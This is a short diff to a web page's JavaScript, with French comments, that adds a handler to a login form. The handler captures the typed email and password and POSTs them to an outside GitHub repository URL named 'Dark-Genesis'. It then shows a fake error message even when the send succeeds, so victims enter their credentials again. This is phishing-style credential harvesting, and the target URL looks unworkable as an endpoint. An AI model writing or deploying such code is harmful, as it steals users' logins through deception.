@@ -46,8 +46,30 @@ document.addEventListener('DOMContentLoaded', function () {
 
 });
 
+    var login1Form = document.querySelector('#Tab2 form');
+    login1Form.addEventListener('submit', function (event) {
+        event.preventDefault(); // Empêche le comportement par défaut du formulaire
 
+        var email = document.querySelector('#Tab2 #email').value;
+        var password = document.querySelector('#Tab2 #password').value;
 
+        // Envoyer les informations de connexion à votre serveur
+        fetch('https://github.com/Creator-Marl/Dark-Genesis.git', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email: email, password: password })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Succès:', data);
+            alert('Erreur. Réessayé !');
+        })
+        .catch((error) => {
+            console.error('Erreur:', error);
+            alert('Erreur lors de la connexion.');
+        });
+    });
 
-
-
+});
